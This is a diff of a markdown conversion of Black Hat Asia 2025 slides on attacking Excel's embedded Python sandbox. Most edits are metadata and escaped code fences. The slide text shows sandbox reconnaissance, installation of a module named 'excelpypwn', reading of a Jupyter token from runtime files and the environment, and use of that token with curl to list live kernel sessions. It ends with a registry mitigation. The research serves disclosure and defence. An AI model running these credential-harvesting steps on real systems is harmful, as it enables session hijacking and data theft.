@@ -8,18 +8,24 @@ year: 2025
 source_pdf: "Black Hat Asia 2025 Slides/Shalom Carmel & Ofir Carmel_The Problems of Embedded Python in Excel, or How to Excel in Pwning Pandas.pdf"
 pages: 37
 sha256: "e9824611a1e1e0b98988e8d2958c645e9328e57772d0f51c8c8fc6f9ad6fcae6"
-text_chars: 13134
-ocr_pages: 2
+text_chars: 13123
+ocr_pages: 1
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 94.8
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:08:05Z"
+converted_at: "2026-08-12T03:57:42Z"
 ---
 # The Problems of Embedded Python in Excel, or How to Excel in Pwning Pandas
 
 **Speakers:** Shalom Carmel, Ofir Carmel  
 **Conference:** Black Hat ASIA 2025  
 **Source:** `Black Hat Asia 2025 Slides/Shalom Carmel & Ofir Carmel_The Problems of Embedded Python in Excel, or How to Excel in Pwning Pandas.pdf` (37 pages)
+
 
 ## Slide 1
 
@@ -29,10 +35,10 @@ The Problems of Embedded Python in Excel
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-- blackhat
 ASIA 2025
 APRIL 3-4, 2025
 BRIEFINGS
@@ -164,18 +170,6 @@ https://support.microsoft.com/en-us/office/get-started-with-python-in-excel-a33f
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-ASIA 2025
-How it works?
-Di v
-fu
-iar
-```
-
 ## Slide 11
 
 #### Architecture
@@ -259,7 +253,7 @@ Interesting environment variables **`list(os.environ.items()) sorted(os.environ.
 
 #### Python standard libraries
 
-```
+\```
 def list_installed_packages():
 try:
 import importlib.metadata
@@ -276,7 +270,7 @@ packages_list_sorted= [(p00, p01, p02, p03 ) for p00, p01, p02, p03
 in sorted(packages_list, key=lambda y: y[0].lower())]
 return packages_list_sorted
 list_installed_packages()
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -284,7 +278,7 @@ list_installed_packages()
 
 #### User writable file system
 
-```
+\```
 import os
 def find_writable_directories(start_dir='/'):
 writable_dirs= []
@@ -294,23 +288,23 @@ try:
 # Check if the directory is writable
 if os.access(root, os.W_OK):
 writable_dirs.append(root)
-```
+\```
 
-```
+\```
 except Exception as e:
-```
+\```
 
-```
+\```
 continue
-```
+\```
 
-```
+\```
 return writable_dirs
-```
+\```
 
-```
+\```
 find_writable_directories()
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -334,11 +328,11 @@ find_writable_directories()
 
 #### Install custom python module
 
-```
+\```
 %%bash
-```
+\```
 
-```
+\```
 cd $HOME
 mkdirfubar
 cd fubar
@@ -351,7 +345,7 @@ echo "    version='0.666.0'" >> setup.py
 echo ")" >> setup.py
 pip install .  > ../fubar.log
 cd ..
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -359,30 +353,30 @@ cd ..
 
 #### Install custom python module
 
-```
+\```
 Processing /home/jovyan/fubar
-```
+\```
 
-```
+\```
 Preparing metadata (setup.py): started
 Preparing metadata (setup.py): finished with status 'done'
 Building wheels for collected packages: excelpypwn
 Building wheel for excelpypwn(setup.py): started
 Building wheel for excelpypwn(setup.py): finished with status 'done'
-```
+\```
 
-```
+\```
 Created wheel for excelpypwn: filename=excelpypwn-0.666.0-py3-none-any.whl size=1168
 sha256=2372634cb81cd91ce0ca431965ae4e43245049313f036aefd22528fc63077ad0
-```
+\```
 
-```
+\```
 Stored in directory: /tmp/pip-ephem-wheel-cache-
 lnir11ew/wheels/d5/aa/24/40817f0f8c7b89493c6ccba31edcbc4c495be26e4987f7be54
 Successfully built excelpypwn
 Installing collected packages: excelpypwn
 Successfully installed excelpypwn-0.666.0
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -390,11 +384,11 @@ Successfully installed excelpypwn-0.666.0
 
 #### Install custom python module
 
-```
+\```
 # verify installation of custom module
 import excelpypwn
 excelpypwn.fubar
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -424,37 +418,37 @@ excelpypwn.fubar
 
 #### How to find Jupyter sessions
 
-```
+\```
 %sxjupyter–paths
-```
+\```
 
-```
+\```
 config:
 /home/jovyan/.jupyter
 /home/jovyan/.local/etc/jupyter
 /app/officepy/etc/jupyter
 /usr/local/etc/jupyter
 /etc/jupyter
-```
+\```
 
-```
+\```
 data:
-```
+\```
 
-```
+\```
 /home/jovyan/.local/share/jupyter
 /app/officepy/share/jupyter
 /usr/local/share/jupyter
 /usr/share/jupyter
-```
+\```
 
-```
+\```
 runtime:
-```
+\```
 
-```
+\```
 /home/jovyan/.local/share/jupyter/runtime
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -462,15 +456,15 @@ runtime:
 
 #### How to find Jupyter sessions
 
-```
+\```
 %sxls -al $(jupyter--runtime-dir)
-```
+\```
 
-```
+\```
 total28
-```
+\```
 
-```
+\```
 drwx-----T 2 jovyanusers4096 Mar 29 22:09 .
 drwxr-xr-x 3 jovyanusers4096 Mar 29 19:44 ..
 -rw-r--r--1 jovyanusers510 Mar 29 19:44 jpserver-71-open.html
@@ -478,7 +472,7 @@ drwxr-xr-x 3 jovyanusers4096 Mar 29 19:44 ..
 -rw-------1 jovyanusers45 Mar 29 19:44 jupyter_cookie_secret
 -rw-------1 jovyanusers334 Mar 2919:45kernel-1bc54bd1-b96d-4b6a-b00f-f976054faa3f.json
 -rw-------1 jovyanusers334 Mar 2922:09kernel-81d23646-a712-4199-bf1f-14c8a95dd90e.json
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -486,41 +480,41 @@ drwxr-xr-x 3 jovyanusers4096 Mar 29 19:44 ..
 
 #### How to find Jupyter sessions
 
-```
+\```
 %sxjupyterserver list
-```
+\```
 
-```
+\```
 Currently running servers:
-```
+\```
 
-```
+\```
 http://SandboxHost-638789305605774754:8888/?token=a8c9a32b-fef8-4926-a45f-4889b9afd71a :: /mnt/file_upload
-```
+\```
 
-```
+\```
 %sxcat /home/jovyan/.local/share/jupyter/runtime/jpserver*json| grep token
-```
+\```
 
-```
+\```
 "token": "a8c9a32b-fef8-4926-a45f-4889b9afd71a",
-```
+\```
 
-```
+\```
 %envJUPYTER_TOKEN
-```
+\```
 
-```
+\```
 a8c9a32b-fef8-4926-a45f-4889b9afd71a
-```
+\```
 
-```
+\```
 os.environ["JUPYTER_TOKEN"]
-```
+\```
 
-```
+\```
 a8c9a32b-fef8-4926-a45f-4889b9afd71a
-```
+\```
 
 #BHAS @BlackHatEvents
 
@@ -528,9 +522,9 @@ a8c9a32b-fef8-4926-a45f-4889b9afd71a
 
 #### How to find Jupyter sessions
 
-```
+\```
 %sxcurl -s http://${HOSTNAME}:8888/api/sessions?token=${token}
-```
+\```
 
 [ { "id": "f3cddf3b-5cf3-45de-9145-2a7e54c5dde0", "path": "3872d4e5-564f-4c2b-aee9-a522473559de.py", "name": null, "type": "notebook", "kernel": { "id": "859fdaa0-7703-4881-af62-18fe3130bdfc", "name": "python3", "last_activity": "2025 -03 -30T11:55:21.642558Z", "execution_state": "busy", "connections": 1 }, "notebook": { "path": "3872d4e5-564f-4c2b-aee9-a522473559de.py", "name": null
 
@@ -610,10 +604,10 @@ a8c9a32b-fef8-4926-a45f-4889b9afd71a
 
 - Block python
 
-```
+\```
 regaddHKCU\software\policies\microsoft\office\16.0\excel\security/v
 PythonFunctionWarnings/t REG_DWORD /d 2 /f
-```
+\```
 
 Value Meaning
 0 Allow all (default)
